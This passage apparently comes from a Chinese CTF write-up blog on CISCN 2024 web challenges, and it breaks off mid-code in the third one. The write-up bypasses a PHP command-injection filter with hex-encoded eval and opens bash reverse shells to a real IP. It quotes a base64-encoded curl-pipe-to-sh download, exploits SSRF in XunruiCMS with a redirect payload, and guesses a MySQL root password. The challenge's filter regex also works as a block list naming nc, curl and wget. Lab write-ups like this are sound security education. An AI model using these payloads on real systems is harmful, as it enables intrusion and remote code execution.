class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i'</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试一下，发现这些字符不会被<code>escapeshellcmd</code>转义：<code>@</code>，<code>+</code>，<code>-</code>，<code>=</code>，<code>:</code>，<code>,</code>，<code>.</code>，<code>/</code></p><p>整理一下我们可以用的命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span><span class="token function">tee</span>base32<span class="token builtin class-name">pwd</span><span class="token builtin class-name">set</span><span class="token builtin class-name">printf</span>phpmysql<span class="token function">paste</span><span class="token comment"># 这个可以直接读文件</span><span class="token function">rev</span><span class="token comment"># 这个可以直接读文件</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤太多了，我们考虑自己用<code>php -r</code>执行一个新的php脚本，用eval，这样就可以套<code>hex2bin</code>这种php自带的字符转换函数</p><p>因为ban了引号，这里得利用强转字符串的特性来获得字符串，用<code>substr</code>截取</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php <span class="token operator">-</span>r <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span>_6563686f20606c73202f603b<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后发现flag不在根目录也不在环境变量里面，猜测在数据库里面（用<code>paste /etc/passwd</code>可以发现存在mysql用户）</p><p>弹个shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/115.236.153.172/13314 &lt;&amp;1'</span><span class="token variable">`</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">php <span class="token operator">-</span>r <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span>_6563686f206062617368202d63202762617368202d69203e26202f6465762f7463702f3131352e3233362e3135332e3137322f3133333134203c263127603b<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后突然想起来webshell没有上下文，只能直接输mysql参数带命令（</p><p>猜root密码为root</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-u</span> root -p<span class="token string">'root'</span> <span class="token parameter variable">-e</span> <span class="token string">'show databases;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240518123150346.png" alt="image-20240518123150346"></p><p>flag在PHP_CMS下的F1ag_Se3Re7</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span>mysql <span class="token parameter variable">-u</span> root -p<span class="token string">'root'</span> <span class="token parameter variable">-e</span> <span class="token string">'show databases;use PHP_CMS;show tables;select * from F1ag_Se3Re7;'</span><span class="token variable">`</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240518123330792.png" alt="image-20240518123330792"></p><p>Boogipop的解法：反斜杠+base64编码秒了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">cmd<span class="token operator">=</span><span class="token keyword">eval</span> <span class="token string backtick-quoted-string">`ec\ho Y3VybCBo\dHRwOi8vOC4xMzAuMjQuMTg4OjgwMDAvMS5zaHxzaA==|base\64 -d|s\h`</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p><del>感觉比上一题简单，当天晚上审了十分钟就出了</del>，但是白天就没想到。。</p><p>flag.php</p><p>返回<code>Just input &#39;cmd&#39; From 127.0.0.1</code></p><p>hint给了源码，还让我们上github看框架的源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Just input 'cmd' From 127.0.0.1"</span><span class="token punctuation">;</span>   <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明显是要ssrf了</p><p>又扫出来个Readme.txt</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">迅睿CMS官方下载地址：https://www.xunruicms.com/down/#### 安装路径将网站运行目录（主目录）设置为：public（如果没有就忽略设置）安装环境监测：/test.php程序安装地址：/install.php后台登录地址：/admin****.php（****是随机的）重置后台地址：https://www.xunruicms.com/doc/1097.html首次使用方法：https://www.xunruicms.com/doc/631.html#### 运行环境Laravel内核：PHP8.0及以上ThinkPHP内核：PHP7.4及以上CodeIgniter内核：PHP7.4及以上CodeIgniter72内核：PHP7.2及以上MySQL数据库：MySQL5及以上，推荐5.7及以上#### 内核切换方法https://www.xunruicms.com/doc/1246.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后台地址随机4位字符，这玩意爆到靶机关掉都爆不出来，所以不求进后台了</p><p>先去github把源码下下来：<a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p><p>然后边看官方文档边审：<a href="https://www.xunruicms.com/doc/203.html">https://www.xunruicms.com/doc/203.html</a></p><p>发现有一个<strong>调用远程数据</strong>的内置函数</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240518213358486.png" alt="image-20240518213358486"></p><p>本地找到对应方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * 调用远程数据 * * @param   string  $url * @param   intval  $timeout 超时时间，0不超时 * @return  string */</span><span class="token keyword">function</span> <span class="token function-definition function">dr_catcher_data</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 获取本地文件</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'file://'</span><span class="token punctuation">)</span>  <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// curl模式</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'curl_init'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"https://"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 跳过证书检查</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYHOST</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 从证书中检查SSL加密算法是否存在</span>        <span class="token punctuation">&#125;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 最大执行时间</span>        <span class="token variable">$timeout</span> <span class="token operator">&amp;&amp;</span> <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_TIMEOUT</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$errno</span> <span class="token operator">=</span> <span class="token function">curl_errno</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">CI_DEBUG</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">log_message</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'获取远程数据失败['</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token operator">.</span><span class="token string single-quoted-string">']：（'</span><span class="token operator">.</span><span class="token variable">$errno</span><span class="token operator">.</span><span class="token string single-quoted-string">'）'</span><span class="token operator">.</span><span class="token function">curl_error</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$errno</span> <span class="token operator">==</span> <span class="token number">35</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 当服务器不支持时改为普通获取方式</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//设置超时参数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$timeout</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stream_context_create'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 解析协议</span>        <span class="token variable">$opt</span> <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string single-quoted-string">'http'</span> <span class="token operator">=></span> <span class="token punctuation">[</span>                <span class="token string single-quoted-string">'method'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'timeout'</span> <span class="token operator">=></span> <span class="token variable">$timeout</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'https'</span> <span class="token operator">=></span> <span class="token punctuation">[</span>                <span class="token string single-quoted-string">'method'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'timeout'</span> <span class="token operator">=></span> <span class="token variable">$timeout</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$ptl</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"https://"</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'https'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'http'</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token variable">$ptl</span> <span class="token operator">=></span> <span class="token variable">$opt</span><span class="token punctuation">[</span><span class="token variable">$ptl</span><span class="token punctuation">]</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼<code>curl_exec</code>等ssrf相关的函数，那么接下来找一下在哪调用这个方法的</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240518214200055.png" alt="image-20240518214200055"></p><p>首先排除前面几个要admin的，直接看 xunruicms&#x2F;dayrui&#x2F;Fcms&#x2F;Control&#x2F;Api&#x2F;Api.php</p><p>发现这里的参数 thumb 可控，就这个了</p><p>仔细看一下，可以发现进else的条件是<code>    $file = WRITEPATH.&#39;file/qrcode-&#39;.md5($value.$thumb.$matrixPointSize.$errorCorrectionLevel).&#39;-qrcode.png&#39;;</code>不存在，所以我们每次打payload的时候都要更换其中变量的值，比如这里的<code>$value</code>，就是每次要更换 text 参数值</p><p>那接下来就很简单了</p><p>本地准备exp.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:http://127.0.0.1/flag.php?cmd=bash%20-c%20'bash%20-i%20>&amp;%20/dev/tcp/115.236.153.172/13314%20&lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>api<span class="token operator">&amp;</span>c<span class="token operator">=</span>api<span class="token operator">&amp;</span>m<span class="token operator">=</span>qrcode<span class="token operator">&amp;</span>text<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>thumb<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//76135132qk.imdo.co/exp.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/05/18/CISCN2024/image-20240519155431792.png" alt="image-20240519155431792"></p><p><img src="/blog/2024/05/18/CISCN2024/image-20240519155448681.png" alt="image-20240519155448681"></p><hr><h2 id="sanic（复现）"><a href="#sanic（复现）" class="headerlink" title="sanic（复现）"></a>sanic（复现）</h2><p>&#x2F;src路由</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sanic <span class="token keyword">import</span> Sanic<span class="token keyword">from</span> sanic<span class="token punctuation">.</span>response <span class="token keyword">import</span> text<span class="token punctuation">,</span> html<span class="token keyword">from</span> sanic_session <span class="token keyword">import</span> Session<span class="token keyword">import</span> pydash<span class="token comment"># pydash==5.1.2</span><span class="token keyword">class</span> <span class="token class-name">Pollute</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>app <span class="token operator">=</span> Sanic<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>static<span class="token punctuation">(</span><span class="token string">"/static/"</span><span class="token punctuation">,</span> <span class="token string">"./static/"</span><span class="token punctuation">)</span>Session<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> html<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'static/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'adm;n'</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"login success"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"login fail"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/src"</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        key <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span>        value <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> key <span class="token keyword">and</span> value <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token builtin">str</span> <span class="token keyword">and</span> <span class="token string">'_.'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>            pollute <span class="token operator">=</span> Pollute<span class="token punctuation">(</span><span class="token punctuation">)</span>            pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>pollute<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>            <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审一下代码</p><p>&#x2F;login路由</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'adm;n'</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"login success"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"login fail"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一开始就被卡住了，这个cookie里的user要为<code>adm;n</code>，然而sanic不会自动转换url编码和unicode编码</p><h3 id="sanic解析绕过cookie检测"><a href="#sanic解析绕过cookie检测" class="headerlink" title="sanic解析绕过cookie检测"></a>sanic解析绕过cookie检测</h3><p>这个时候要去审计sanic的源码</p><p><img src="/blog/2024/05/18/CISCN2024/image-20240520195415031.png" alt="image-20240520195415031"></p><p>看一下它解析cookie的方法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">parse_cookie</span><span class="token punctuation">(</span>raw<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    cookies<span class="token punctuation">:</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> token <span class="token keyword">in</span> raw<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        name<span class="token punctuation">,</span> sep<span class="token punctuation">,</span> value <span class="token operator">=</span> token<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> name<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        value <span class="token operator">=</span> value<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># Support cookies =value or plain value with no name</span>        <span class="token comment"># https://github.com/httpwg/http-extensions/issues/159</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> sep<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> name<span class="token punctuation">:</span>                <span class="token comment"># Empty value like ;; or a cookie header with no value</span>                <span class="token keyword">continue</span>            name<span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> name        <span class="token keyword">if</span> COOKIE_NAME_RESERVED_CHARS<span class="token punctuation">.</span>search<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># no cov</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token keyword">and</span> value<span class="token punctuation">[</span><span class="token 